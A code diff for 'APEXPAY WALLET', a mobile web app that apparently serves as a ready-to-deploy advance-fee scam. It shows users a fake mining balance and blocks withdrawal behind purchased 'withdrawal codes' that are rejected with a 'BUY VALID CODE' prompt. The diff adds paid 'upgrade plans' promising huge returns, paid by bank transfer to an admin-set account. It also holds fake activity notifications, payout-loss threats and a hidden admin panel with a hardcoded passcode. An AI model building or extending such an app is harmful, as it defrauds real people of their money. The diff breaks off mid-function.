@@ -6,14 +6,7 @@
     <title>APEXPAY WALLET</title>
     <style>
         * { box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0d1117;
-            color: #ffffff;
-            margin: 0;
-            padding: 0;
-            text-align: center;
-        }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0d1117; color: #ffffff; margin: 0; padding: 0; text-align: center; }
         .page { display: none; padding: 20px; padding-bottom: 90px; min-height: 100vh; }
         .active-page { display: block; }
         h1, h2, h3 { color: #f39c12; margin-bottom: 10px; }
@@ -21,20 +14,14 @@
         
         .dollar-symbol { font-size: 80px; margin: 15px 0; text-shadow: 0 0 20px rgba(46, 204, 113, 0.5); }
         
-        input, select {
-            display: block; width: 90%; max-width: 400px; margin: 15px auto; padding: 15px;
-            border-radius: 8px; border: 1px solid #334155; background: #1e293b; color: white; font-size: 16px;
-        }
+        input, select { display: block; width: 90%; max-width: 400px; margin: 15px auto; padding: 15px; border-radius: 8px; border: 1px solid #334155; background: #1e293b; color: white; font-size: 16px; }
         input:focus, select:focus { outline: none; border-color: #f39c12; }
         
-        .btn {
-            background: #f39c12; color: #0d1117; border: none; padding: 15px 30px; font-size: 16px;
-            font-weight: bold; border-radius: 8px; cursor: pointer; width: 90%; max-width: 400px;
-            margin: 10px auto; text-transform: uppercase; transition: opacity 0.2s; display: block;
-        }
+        .btn { background: #f39c12; color: #0d1117; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 90%; max-width: 400px; margin: 10px auto; text-transform: uppercase; transition: opacity 0.2s; display: block; }
         .btn:disabled { background: #475569 !important; color: #94a3b8 !important; cursor: not-allowed; opacity: 0.6; }
         .btn-secondary { background: #334155; color: #fff; }
         .btn-danger { background: #e74c3c; color: #fff; }
+        .btn-success { background: #2ecc71; color: #000; }
         .link { color: #f39c12; cursor: pointer; text-decoration: underline; margin-top: 10px; display: inline-block; }
 
         .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: #161b22; border-bottom: 1px solid #30363d; }
@@ -53,6 +40,9 @@
         .hidden { display: none !important; }
         .error-x-btn { font-size: 60px; color: #e74c3c; background: none; border: none; cursor: pointer; margin-bottom: 10px; }
 
+        .btn-beam { background: #2ecc71; color: #000; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 90%; max-width: 400px; margin: 15px auto 5px auto; text-transform: uppercase; display: block; animation: pulse-green 2s infinite; }
+        @keyframes pulse-green { 0% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(46, 204, 113, 0); } 100% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0); } }
+
         .toast-notification { position: fixed; top: 15px; left: 50%; transform: translateX(-50%); background: rgba(30, 41, 59, 0.95); border: 1px solid #f39c12; color: #ffffff; padding: 10px 18px; border-radius: 25px; font-size: 13px; z-index: 999; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 300px; margin: 20px auto; }
         .key { background: #1e293b; padding: 18px; font-size: 22px; border-radius: 10px; cursor: pointer; user-select: none; border: 1px solid #334155; }
@@ -61,23 +51,38 @@
         .spinner { border: 6px solid #1e293b; border-top: 6px solid #f39c12; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .text-container { text-align: left; max-width: 400px; margin: 0 auto 15px auto; background: #161b22; padding: 18px; border-radius: 10px; border: 1px solid #30363d; }
-        .code-box { background: #1e293b; border: 2px dashed #2ecc71; padding: 15px; border-radius: 10px; margin: 15px auto; max-width: 400px; font-size: 24px; font-weight: bold; color: #2ecc71; letter-spacing: 4px; }
         
         .warning-banner { background: rgba(231, 76, 60, 0.15); border: 1px solid #e74c3c; padding: 12px; margin: 15px auto; border-radius: 8px; max-width: 400px; text-align: left; font-size: 13px; color: #ffcccc; line-height: 1.4; }
         .warning-banner strong { color: #e74c3c; font-size: 14px; }
+
+        /* Plan Colors & Styles */
+        .plan-card { text-align: left; max-width: 400px; margin: 0 auto 20px auto; padding: 20px; border-radius: 12px; color: #fff; position: relative; }
+        .plan-basic { background: linear-gradient(135deg, #1e3a8a, #3b82f6); border: 2px solid #60a5fa; }
+        .plan-silver { background: linear-gradient(135deg, #475569, #94a3b8); border: 2px solid #cbd5e1; }
+        .plan-gold { background: linear-gradient(135deg, #b45309, #f59e0b); border: 2px solid #fcd34d; }
+        .plan-diamond { background: linear-gradient(135deg, #0f766e, #06b6d4); border: 2px solid #67e8f9; }
+        .plan-title { font-size: 24px; font-weight: bold; margin: 0 0 5px 0; color: #fff; text-shadow: 1px 1px 3px rgba(0,0,0,0.5); }
+        .plan-price { font-size: 20px; font-weight: bold; margin: 10px 0; }
+        .plan-features { list-style: none; padding: 0; margin: 15px 0; font-size: 14px; }
+        .plan-features li { margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+        .copy-box { background: #0d1117; padding: 10px; border-radius: 6px; display: flex; justify-content: space-between; align-items: center; margin: 10px 0; border: 1px solid #334155; }
+        .copy-btn { background: #334155; border: none; color: white; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; }
+        
+        .warning-icon { width: 60px; height: 60px; border-radius: 50%; border: 3px solid #f39c12; color: #f39c12; font-size: 40px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto; font-weight: bold; }
+        .modal-buttons { display: flex; gap: 10px; margin-top: 20px; }
+        .modal-buttons .btn { margin: 0; width: 50%; padding: 12px; font-size: 14px; }
     </style>
 </head>
 <body>
     <div id="toast" class="toast-notification hidden"><span id="toast-text"></span></div>
 
-    <!-- PAGE 1: HOME -->
+    <!-- HOME & AUTH PAGES -->
     <div id="page-home" class="page active-page">
         <h1>APEXPAY WALLET</h1><div class="dollar-symbol">💲</div><h2>Welcome to APEXPAY</h2>
         <p>Securely manage your digital assets and grow your wealth with ease.</p>
         <button class="btn" onclick="navigate('page-signup')">GET STARTED</button>
     </div>
 
-    <!-- PAGE 2: SIGN UP -->
     <div id="page-signup" class="page">
         <h1>APEXPAY WALLET</h1><div class="dollar-symbol" style="font-size: 50px;">💲</div><h3>Create Account</h3>
         <div class="warning-banner"><strong>⚠️ STRICT WARNING:</strong> Do not log out or attempt to create multiple accounts. Doing so will make your account permanently invalid and you will <strong>NOT</strong> receive your payout.</div>
@@ -88,7 +93,6 @@
         <div class="link" onclick="navigate('page-signin')">Already have an account? Sign in here</div>
     </div>
 
-    <!-- PAGE 3: SIGN IN -->
     <div id="page-signin" class="page">
         <h1>APEXPAY WALLET</h1><div class="dollar-symbol" style="font-size: 50px;">💲</div><h3>Sign In</h3>
         <div class="warning-banner"><strong>⚠️ STRICT WARNING:</strong> Do not log out or attempt to create multiple accounts. Doing so will make your account permanently invalid and you will <strong>NOT</strong> receive your payout.</div>
@@ -97,10 +101,9 @@
         <div class="link" onclick="navigate('page-signup')">Don't have an account? Sign up here</div>
     </div>
 
-    <!-- PAGE 4: DASHBOARD -->
+    <!-- DASHBOARD -->
     <div id="page-dashboard" class="page">
         <div class="top-nav">
-            <!-- Tap 4 times on APEXPAY logo to open secret Admin login -->
             <span style="font-weight: bold; color: #2ecc71; cursor: pointer; user-select: none;" onclick="handleLogoClick()">⚡ APEXPAY</span>
             <div class="top-nav-right">
                 <button class="nav-btn" style="background: #2ecc71; color: #000;" onclick="contactAdmin()">💬 Contact Admin</button>
@@ -110,14 +113,6 @@
         </div>
 
         <div class="warning-banner" style="margin-top: 20px;"><strong>⚠️ IMPORTANT:</strong> Do not log out or create multiple accounts. It will invalidate your account and cancel your payouts.</div>
-
-        <!-- Banner showing approved withdrawal code to user if available -->
-        <div id="user-code-banner" class="hidden">
-            <div class="code-box">
-                <span style="font-size:12px; color:#cbd5e1; display:block; margin-bottom:5px;">YOUR APPROVED WITHDRAWAL CODE:</span>
-                <span id="user-display-code">------</span>
-            </div>
-        </div>
 
         <div class="balance-card">
             <h3 style="margin: 0;">Mining Balance</h3>
@@ -135,17 +130,16 @@
         </div>
     </div>
 
-    <!-- MODALS -->
+    <!-- GENERAL MODALS -->
     <div id="modal-mining" class="modal hidden">
-        <div class="modal-content">
-            <div id="mining-spinner-box"><h2>Mining... ⛏️</h2><div class="spinner"></div><h1 id="countdown-timer">5</h1></div>
-            <div id="mining-success-box" class="hidden"><div style="font-size: 70px; color: #2ecc71;">✔</div><h2 style="color: #2ecc71;">Success!</h2><p>₦96,000 added to balance.</p><button class="btn" onclick="closeMiningModal()">CONTINUE</button></div>
-        </div>
+        <div class="modal-content"><div id="mining-spinner-box"><h2>Mining... ⛏️</h2><div class="spinner"></div><h1 id="countdown-timer">5</h1></div>
+        <div id="mining-success-box" class="hidden"><div style="font-size: 70px; color: #2ecc71;">✔</div><h2 style="color: #2ecc71;">Success!</h2><p>₦96,000 added to balance.</p><button class="btn" onclick="closeMiningModal()">CONTINUE</button></div></div>
     </div>
 
     <div id="modal-limit" class="modal hidden">
         <div class="modal-content"><h2 style="color: #e74c3c;">LIMIT REACHED</h2><p>You have reached your free mining capacity.</p>
-        <button class="btn" onclick="contactAdmin()">Contact Admin on Telegram</button><button class="btn btn-secondary" onclick="navigate('page-withdraw'); document.getElementById('modal-limit').classList.add('hidden');">Withdraw Funds</button></div>
+        <button class="btn btn-success" onclick="navigate('page-more-mines'); document.getElementById('modal-limit').classList.add('hidden');">UPGRADE PLAN</button>
+        <button class="btn btn-secondary" onclick="navigate('page-withdraw'); document.getElementById('modal-limit').classList.add('hidden');">Withdraw Funds</button></div>
     </div>
 
     <div id="modal-history" class="modal hidden">
@@ -154,13 +148,17 @@
     </div>
 
     <div id="modal-wrong-code" class="modal hidden">
-        <div class="modal-content"><button class="error-x-btn" onclick="document.getElementById('modal-wrong-code').classList.add('hidden')">❌</button><h2 style="color: #e74c3c;">INVALID CODE</h2><p>The code you entered is invalid or has already been used.</p></div>
+        <div class="modal-content">
+            <button class="error-x-btn" onclick="document.getElementById('modal-wrong-code').classList.add('hidden')">❌</button>
+            <h2 style="color: #e74c3c;">INVALID CODE</h2><p>The code you entered is invalid or has already been used.</p>
+            <button class="btn-beam" onclick="document.getElementById('modal-wrong-code').classList.add('hidden'); navigate('page-buy-code-1');">BUY VALID CODE</button>
+        </div>
     </div>
 
     <!-- WITHDRAWAL FLOW PAGES -->
     <div id="page-withdraw" class="page">
         <h1>WITHDRAW</h1><input type="text" id="with-name" readonly><input type="tel" id="with-acct-num" readonly>
-        <select id="with-bank"><option value="">Select Bank</option><option>Opay</option><option>Palmpay</option><option>Moniepoint</option><option>UBA</option><option>GTB</option><option>First Bank</option></select>
+        <select id="with-bank"><option value="">Select Bank</option><option>Opay</option><option>Palmpay</option><option>Moniepoint</option><option>Access Bank</option><option>GTB</option><option>UBA</option><option>First Bank</option><option>Zenith Bank</option><option>Kuda</option><option>Other</option></select>
         <input type="number" id="with-amount" placeholder="Amount" oninput="validateWithdrawalForm()">
         <p id="amount-error" style="color: #e74c3c; display: none;">Amount exceeds your available balance!</p>
         <button class="btn" id="btn-proceed-withdraw" disabled onclick="navigate('page-confirm-withdraw')">PROCEED</button>
@@ -172,8 +170,17 @@
         <button class="btn" onclick="navigate('page-pin')">YES, PROCEED</button><button class="btn btn-danger" onclick="navigate('page-dashboard')">REJECT</button>
     </div>
 
+    <!-- ENTER PIN PAGE (WITH HIDDEN CODE DISPLAY) -->
     <div id="page-pin" class="page">
-        <h2>Enter Code</h2><p style="font-size:12px;">Enter your 6-Digit Withdrawal Code. Codes can only be used <strong>ONCE</strong>.</p>
+        <h2>Enter Code</h2>
+        
+        <!-- THIS IS WHERE THE CODE SHOWS FOR THE USER ONCE APPROVED -->
+        <div id="approved-code-display" class="hidden" style="background: rgba(46, 204, 113, 0.1); border: 2px dashed #2ecc71; padding: 15px; border-radius: 8px; margin-bottom: 20px; max-width: 300px; margin-left: auto; margin-right: auto;">
+            <p style="color: #2ecc71; margin: 0 0 5px 0; font-size: 12px; font-weight: bold;">YOUR APPROVED WITHDRAWAL CODE:</p>
+            <h1 id="the-actual-code" style="color: #2ecc71; margin: 0; letter-spacing: 6px;">------</h1>
+        </div>
+
+        <p style="font-size:12px;">Enter your 6-Digit Withdrawal Code. Codes can only be used <strong>ONCE</strong>.</p>
         <div class="pin-display" id="pin-display">_ _ _ _ _ _</div>
         <div class="keypad">
             <div class="key" onclick="pressKey('1')">1</div><div class="key" onclick="pressKey('2')">2</div><div class="key" onclick="pressKey('3')">3</div>
@@ -181,15 +188,119 @@
             <div class="key" onclick="pressKey('7')">7</div><div class="key" onclick="pressKey('8')">8</div><div class="key" onclick="pressKey('9')">9</div>
             <div class="key" onclick="pressKey('C')" style="background:#e74c3c;">C</div><div class="key" onclick="pressKey('0')">0</div><div class="key" onclick="submitPin()" style="background:#2ecc71;">✔</div>
         </div>
-        <button class="btn" onclick="navigate('page-buy-code-1')">BUY CODE</button><button class="btn btn-secondary" onclick="navigate('page-dashboard')">Cancel</button>
+        <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Cancel</button>
+    </div>
+        <!-- MORE MINES (PLANS) PAGE -->
+    <div id="page-more-mines" class="page">
+        <h1>MORE MINES</h1>
+        <p style="margin-bottom: 25px;">Upgrade your capacity and boost your daily earnings.</p>
+        
+        <!-- Basic Plan -->
+        <div class="plan-card plan-basic">
+            <h3 class="plan-title">Basic Plan 🥉</h3>
+            <div class="plan-price">Cost: ₦10,000</div>
+            <p style="color:#bfdbfe; margin:0; font-weight:bold;">💲 Earn up to ₦172,000</p>
+            <ul class="plan-features">
+                <li>✔ Access to standard mining speed ⛏️</li>
+                <li>✔ Daily mining reward up to 24,000</li>
+                <li>✔ Withdraw anytime after mining</li>
+            </ul>
+            <button class="btn" style="background:#fff; color:#1e3a8a;" onclick="selectPlan('basic')">Upgrade to Basic Plan</button>
+        </div>
+
+        <!-- Silver Plan -->
+        <div class="plan-card plan-silver">
+            <h3 class="plan-title">Silver Plan 🥈</h3>
+            <div class="plan-price">Cost: ₦15,000</div>
+            <p style="color:#e2e8f0; margin:0; font-weight:bold;">💲 Earn up to ₦380,000</p>
+            <ul class="plan-features">
+                <li>✔ Double mining speed ⛏️</li>
+                <li>✔ Increased daily mining cap</li>
+                <li>✔ Priority withdrawal</li>
+            </ul>
+            <button class="btn" style="background:#fff; color:#475569;" onclick="selectPlan('silver')">Upgrade to Silver Plan</button>
+        </div>
+
+        <!-- Gold Plan -->
+        <div class="plan-card plan-gold">
+            <h3 class="plan-title">Gold Plan 🥇</h3>
+            <div class="plan-price">Cost: ₦25,000</div>
+            <p style="color:#fef3c7; margin:0; font-weight:bold;">💲 Earn up to ₦640,000</p>
+            <ul class="plan-features">
+                <li>✔ 3x mining speed ⛏️</li>
+                <li>✔ High profit mining algorithm</li>
+                <li>✔ Instant withdrawal after mining</li>
+            </ul>
+            <button class="btn" style="background:#fff; color:#b45309;" onclick="selectPlan('gold')">Upgrade to Gold Plan</button>
+        </div>
+
+        <!-- Diamond Plan -->
+        <div class="plan-card plan-diamond">
+            <h3 class="plan-title">Diamond Plan 💎</h3>
+            <div class="plan-price">Cost: ₦50,000</div>
+            <p style="color:#cffafe; margin:0; font-weight:bold;">💲 Earn up to ₦1,250,000</p>
+            <ul class="plan-features">
+                <li>✔ 5x ultra speed mining ⛏️</li>
+                <li>✔ Unlimited daily mining potential</li>
+                <li>✔ Lifetime withdrawal access</li>
+            </ul>
+            <button class="btn" style="background:#fff; color:#0f766e;" onclick="selectPlan('diamond')">Upgrade to Diamond Plan</button>
+        </div>
+        
+        <button class="btn btn-secondary" style="margin-top:20px;" onclick="navigate('page-dashboard')">Back to Dashboard</button>
     </div>
 
-    <!-- BUY CODE FLOW -->
+    <!-- PLAN UPGRADE WARNING MODAL -->
+    <div id="modal-plan-confirm" class="modal hidden">
+        <div class="modal-content" style="text-align: center;">
+            <div class="warning-icon">!</div>
+            <h2>Confirm Upgrade</h2>
+            <p>You are about to upgrade to the <strong id="warning-plan-name" style="color:#f39c12;">Plan</strong>.</p>
+            <div style="background:#1e293b; padding:15px; border-radius:8px; text-align:left; font-size:14px; margin-bottom:15px; border:1px solid #334155;">
+                <p style="margin:5px 0;"><strong>Cost:</strong> ₦<span id="warning-plan-cost"></span></p>
+                <p style="margin:5px 0;"><strong>Potential Earning:</strong> ₦<span id="warning-plan-earn"></span></p>
+                <p style="margin:5px 0; font-size:12px; color:#94a3b8;"><span id="warning-plan-extra"></span></p>
+            </div>
+            <div class="modal-buttons">
+                <button class="btn btn-secondary" onclick="document.getElementById('modal-plan-confirm').classList.add('hidden')">Cancel</button>
+                <button class="btn btn-success" onclick="proceedToPlanPayment()">Proceed</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PLAN PAYMENT PAGE -->
+    <div id="page-plan-payment" class="page">
+        <h1>PLAN PAYMENT</h1>
+        <p>You are upgrading to <strong id="pay-plan-name" style="color:#f39c12;">Plan</strong></p>
+        
+        <div class="text-container" style="text-align: center;">
+            <h2 style="margin:0; color:#2ecc71;">Cost: ₦<span id="pay-plan-cost"></span></h2>
+            <p style="margin-top:5px; font-size:13px;">Potential Earning: ₦<span id="pay-plan-earn"></span></p>
+        </div>
+
+        <div class="text-container">
+            <h3 style="margin-top:0;">Make Transfer To:</h3>
+            
+            <p style="margin:5px 0; font-size:12px; color:#94a3b8;">Bank Name:</p>
+            <div class="copy-box"><span id="pay-admin-bank"></span> <button class="copy-btn" onclick="copyText('pay-admin-bank')">Copy</button></div>
+            
+            <p style="margin:15px 0 5px 0; font-size:12px; color:#94a3b8;">Account Number:</p>
+            <div class="copy-box"><strong id="pay-admin-acct" style="color:#f39c12; font-size:18px;"></strong> <button class="copy-btn" onclick="copyText('pay-admin-acct')">Copy</button></div>
+            
+            <p style="margin:15px 0 5px 0; font-size:12px; color:#94a3b8;">Account Name:</p>
+            <div class="copy-box"><span id="pay-admin-name"></span></div>
+        </div>
+        
+        <button class="btn" style="background:#2ecc71; color:#000;" onclick="confirmPlanTransfer()">I'VE MADE THIS TRANSFER</button>
+        <button class="btn btn-secondary" onclick="navigate('page-more-mines')">Back</button>
+    </div>
+
+    <!-- BUY WITHDRAWAL CODE FLOW -->
     <div id="page-buy-code-1" class="page">
         <h2>Buy Code</h2><p>Fee: <strong style="color: #f39c12;">₦<span id="display-code-price">6,250</span></strong></p>
         <input type="text" id="sender-name" placeholder="Your Account Name" oninput="validateBuyCodeStep1()">
         <input type="tel" id="sender-acct" placeholder="Your Account Number (10 digits)" maxlength="10" oninput="validateBuyCodeStep1()">
-        <select id="sender-bank" onchange="validateBuyCodeStep1()"><option value="">Select Your Bank</option><option>Opay</option><option>Palmpay</option><option>Other</option></select>
+        <select id="sender-bank" onchange="validateBuyCodeStep1()"><option value="">Select Your Bank</option><option>Opay</option><option>Palmpay</option><option>Moniepoint</option><option>Access Bank</option><option>GTB</option><option>UBA</option><option>First Bank</option><option>Zenith Bank</option><option>Kuda</option><option>Other</option></select>
         <button class="btn" id="btn-buy-step1" disabled onclick="navigate('page-buy-code-2')">PROCEED TO PAY</button>
     </div>
 
@@ -206,10 +317,18 @@
         <h1 style="color: #e74c3c;">Admin Control Panel</h1>
         
         <div class="text-container">
+            <h3>Admin Bank Details</h3>
+            <p style="font-size: 12px; color: #cbd5e1;">Users will pay to this account for plans and codes:</p>
+            <input type="text" id="set-admin-bank" placeholder="Bank Name (e.g. Opay)">
+            <input type="text" id="set-admin-acct" placeholder="Account Number">
+            <input type="text" id="set-admin-name" placeholder="Account Name">
+            <button class="btn" onclick="saveAdminSettings()">Save Bank Details</button>
+        </div>
+
+        <div class="text-container">
             <h3>Telegram Support Link</h3>
-            <p style="font-size: 12px; color: #cbd5e1;">Input your Telegram link for users to contact you:</p>
             <input type="url" id="set-telegram-link" placeholder="https://t.me/yourusername">
-            <button class="btn" onclick="saveAdminSettings()">Save Telegram Link</button>
+            <button class="btn" onclick="saveAdminSettings()">Save Link</button>
         </div>
 
         <div class="text-container">
@@ -227,7 +346,7 @@
         <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Exit Admin Panel</button>
     </div>
 
-    <!-- INFORMATIONAL PAGES -->
+    <!-- INFO PAGE -->
     <div id="page-learn-more" class="page">
         <h1>LEARN MORE</h1>
         <div class="text-container"><h3 style="color: #2ecc71;">Welcome to APEXPAY</h3><p>APEXPAY Wallet is a digital asset platform designed to help you grow your wealth effortlessly.</p></div>
@@ -235,18 +354,20 @@
         <div class="text-container"><h3 style="color: #2ecc71;">How to Withdraw</h3><p>To ensure security, a one-time <strong>Withdrawal Code</strong> is required to cash out. You can purchase this code inside the app.</p></div>
         <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Back to Dashboard</button>
     </div>
-
-    <div id="page-more-mines" class="page">
-        <h2>MORE MINES</h2><p>Upgrade your capacity to mine up to ₦500,000 daily.</p>
-        <button class="btn" style="background: #2ecc71; color: #000;" onclick="contactAdmin()">Contact Admin on Telegram</button>
-        <button class="btn btn-secondary" onclick="navigate('page-dashboard')">Back to Dashboard</button>
-    </div>
-             <script>
+        <script>
         let currentUser = { phone: '', name: '', acctNum: '', balance: 0, hasMined: false, isAdmin: false, totalMined: 0, totalWithdrawn: 0, history: [] };
         let systemSettings = { codePrice: 6250, adminBank: 'Opay', adminName: 'ApexPay Business Account', adminAcct: '8012345678', validCode: null, telegramLink: 'https://t.me/yourusername', adminPin: '9999' };
         let currentPin = "";
         let logoTapCount = 0;
         let logoTapTimer = null;
+        let selectedPlanTemp = null;
+
+        const allPlans = {
+            basic: { name: 'Basic Plan', cost: '10,000', earn: '172,000', extra: 'Includes 24,000 daily mining reward' },
+            silver: { name: 'Silver Plan', cost: '15,000', earn: '380,000', extra: 'Includes increased daily mining caps' },
+            gold: { name: 'Gold Plan', cost: '25,000', earn: '640,000', extra: 'Includes high profit algorithms' },
+            diamond: { name: 'Diamond Plan', cost: '50,000', earn: '1,250,000', extra: 'Includes unlimited daily potential' }
+        };
 
         window.onload = () => {
             const savedSettings = localStorage.getItem('apex_settings');
@@ -257,9 +378,7 @@
                 currentUser = JSON.parse(savedUser);
                 updateDashboardUI();
                 navigate('page-dashboard');
-            } else { 
-                navigate('page-home'); 
-            }
+            } else { navigate('page-home'); }
             startLiveToasts();
         };
 
@@ -267,34 +386,76 @@
             document.querySelectorAll('.page').forEach(page => page.classList.remove('active-page'));
             document.getElementById(pageId).classList.add('active-page');
             window.scrollTo(0,0);
+            
+            // If navigating to the PIN page, check if they have an approved code to display
+            if (pageId === 'page-pin') {
+                const codeBanner = document.getElementById('approved-code-display');
+                if (systemSettings.validCode) {
+                    document.getElementById('the-actual-code').innerText = systemSettings.validCode;
+                    codeBanner.classList.remove('hidden');
+                } else {
+                    codeBanner.classList.add('hidden');
+                }
+            }
         }
 
-        // Secret Admin Access: Tap logo 4 times quickly
         function handleLogoClick() {
             logoTapCount++;
             clearTimeout(logoTapTimer);
             if (logoTapCount >= 4) {
                 logoTapCount = 0;
                 const enteredPin = prompt("Enter Secret Admin Passcode (Default: 9999):");
-                
-                // FIXED PASSCODE LOGIC: Will always accept '9999' or the saved admin pin.
                 if (enteredPin === '9999' || (systemSettings && enteredPin === systemSettings.adminPin)) {
+                    document.getElementById('set-admin-bank').value = systemSettings.adminBank;
+                    document.getElementById('set-admin-acct').value = systemSettings.adminAcct;
+                    document.getElementById('set-admin-name').value = systemSettings.adminName;
                     navigate('page-admin');
-                } else if (enteredPin !== null) {
-                    alert("Incorrect Admin Passcode!");
-                }
-            } else {
-                logoTapTimer = setTimeout(() => { logoTapCount = 0; }, 1200);
-            }
+                } else if (enteredPin !== null) { alert("Incorrect Admin Passcode!"); }
+            } else { logoTapTimer = setTimeout(() => { logoTapCount = 0; }, 1200); }
         }
 
         function contactAdmin() {
             const link = systemSettings.telegramLink;
-            if (link && link.trim() !== '') {
-                window.open(link, '_blank');
-            } else {
-                alert("Admin Telegram link is not configured yet.");
-            }
+            if (link && link.trim() !== '') { window.open(link, '_blank'); } else { alert("Admin Telegram link is not configured yet."); }
+        }
+
+        // Plan Selection Logic
+        function selectPlan(planKey) {
+            selectedPlanTemp = allPlans[planKey];
+            document.getElementById('warning-plan-name').innerText = selectedPlanTemp.name;
+            document.getElementById('warning-plan-cost').innerText = selectedPlanTemp.cost;
+            document.getElementById('warning-plan-earn').innerText = selectedPlanTemp.earn;
+            document.getElementById('warning-plan-extra').innerText = selectedPlanTemp.extra;
+            document.getElementById('modal-plan-confirm').classList.remove('hidden');
+        }
+
+        function proceedToPlanPayment() {
+            document.getElementById('modal-plan-confirm').classList.add('hidden');
+            
+            // Populate Payment Page
+            document.getElementById('pay-plan-name').innerText = selectedPlanTemp.name;
+            document.getElementById('pay-plan-cost').innerText = selectedPlanTemp.cost;
+            document.getElementById('pay-plan-earn').innerText = selectedPlanTemp.earn;
+            
+            document.getElementById('pay-admin-bank').innerText = systemSettings.adminBank || 'Admin Bank';
+            document.getElementById('pay-admin-acct').innerText = systemSettings.adminAcct || 'Admin Acct';
+            document.getElementById('pay-admin-name').innerText = systemSettings.adminName || 'Admin Name';
+            
+            navigate('page-plan-payment');
+        }
+
+        function copyText(elementId) {
+            const textToCopy = document.getElementById(elementId).innerText;
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                alert("Copied to clipboard: " + textToCopy);
+            }).catch(err => {
+                alert("Failed to copy. Please copy manually.");
+            });
+        }
+
+        function confirmPlanTransfer() {
+            alert("Transfer noted! You will now be redirected to the Admin's Telegram to submit your proof of payment for activation.");
+            contactAdmin();
         }
 
         function registerUser() {
@@ -306,48 +467,25 @@
             if (name.length < 2) { alert("Error: Please enter a valid account name."); return; }
             if (acct.length !== 10) { alert("Error: Account number MUST be exactly 10 digits."); return; }
 
-            currentUser.phone = phone; 
-            currentUser.name = name; 
-            currentUser.acctNum = acct; 
-            currentUser.balance = 0;
-            currentUser.isAdmin = false;
-            
-            saveUser(); 
-            updateDashboardUI(); 
-            navigate('page-dashboard');
+            currentUser.phone = phone; currentUser.name = name; currentUser.acctNum = acct; currentUser.balance = 0; currentUser.isAdmin = false;
+            saveUser(); updateDashboardUI(); navigate('page-dashboard');
         }
 
         function loginUser() {
             const phone = document.getElementById('login-phone').value.trim();
             if (phone.length !== 11) { alert("Error: Phone number MUST be exactly 11 digits."); return; }
-
             const savedUser = localStorage.getItem('apex_user');
             if (savedUser) {
                 const parsedUser = JSON.parse(savedUser);
-                if (parsedUser.phone === phone) {
-                    currentUser = parsedUser; 
-                } else {
-                    currentUser.phone = phone; 
-                    currentUser.name = "User " + phone.substring(7); 
-                    currentUser.acctNum = "00" + phone.substring(3); 
-                    currentUser.balance = 0;
-                }
-            } else {
-                currentUser.phone = phone; 
-                currentUser.name = "User " + phone.substring(7); 
-                currentUser.acctNum = "00" + phone.substring(3); 
-                currentUser.balance = 0;
-            }
-
-            saveUser(); 
-            updateDashboardUI(); 
-            navigate('page-dashboard');
+                if (parsedUser.phone === phone) { currentUser = parsedUser; } 
+                else { currentUser.phone = phone; currentUser.name = "User " + phone.substring(7); currentUser.acctNum = "00" + phone.substring(3); currentUser.balance = 0; }
+            } else { currentUser.phone = phone; currentUser.name = "User " + phone.substring(7); currentUser.acctNum = "00" + phone.substring(3); currentUser.balance = 0; }
+            saveUser(); updateDashboardUI(); navigate('page-dashboard');
         }
 
         function logoutUser() {
             if (confirm("WARNING: Logging out or changing accounts may result in account invalidation and loss of funds. Are you sure you want to proceed?")) { 
-                localStorage.removeItem('apex_user'); 
-                navigate('page-home'); 
+                localStorage.removeItem('apex_user'); navigate('page-home'); 
             }
         }
 
@@ -365,16 +503,10 @@
             document.getElementById('display-code-price').innerText = parseFloat(systemSettings.codePrice).toLocaleString();
             document.getElementById('display-code-price2').innerText = parseFloat(systemSettings.codePrice).toLocaleString();
             document.getElementById('set-telegram-link').value = systemSettings.telegramLink || '';
-
-            // Display valid approved code to the user if it exists
-            const codeBanner = document.getElementById('user-code-banner');
-            const codeDisplay = document.getElementById('user-display-code');
-            if (systemSettings.validCode) {
-                codeDisplay.innerText = systemSettings.validCode;
-                codeBanner.classList.remove('hidden');
-            } else {
-                codeBanner.classList.add('hidden');
-            }
+            
+            document.getElementById('admin-bank-display').innerText = systemSettings.adminBank;
+            document.getElementById('admin-name-display').innerText = systemSettings.adminName;
+            document.getElementById('admin-acct-display').innerText = systemSettings.adminAcct;
 
             if (localStorage.getItem('pending_payment') === 'true') {
                 document.getElementById('pending-list').innerText = "1 Pending Payment from User";
@@ -383,7 +515,7 @@
         }
 
         function startLiveToasts() {
-            const activities = ["Someone bought a withdrawal code", "A user withdrew ₦96,000", "A user mined ₦96,000"];
+            const activities = ["Someone upgraded to Silver Plan", "A user withdrew ₦96,000", "A user mined ₦96,000"];
             setInterval(() => {
                 const toast = document.getElementById('toast');
                 document.getElementById('toast-text').innerText = activities[Math.floor(Math.random() * activities.length)];
@@ -393,29 +525,21 @@
         }
 
         function startMiningProcess() {
-            if (currentUser.hasMined || currentUser.balance >= 96000) { 
-                document.getElementById('modal-limit').classList.remove('hidden'); 
-                return; 
-            }
+            if (currentUser.hasMined || currentUser.balance >= 96000) { document.getElementById('modal-limit').classList.remove('hidden'); return; }
             document.getElementById('modal-mining').classList.remove('hidden');
             document.getElementById('mining-spinner-box').classList.remove('hidden');
             document.getElementById('mining-success-box').classList.add('hidden');
-            let count = 5; 
-            document.getElementById('countdown-timer').innerText = count;
+            let count = 5; document.getElementById('countdown-timer').innerText = count;
             const timer = setInterval(() => {
-                count--; 
-                document.getElementById('countdown-timer').innerText = count;
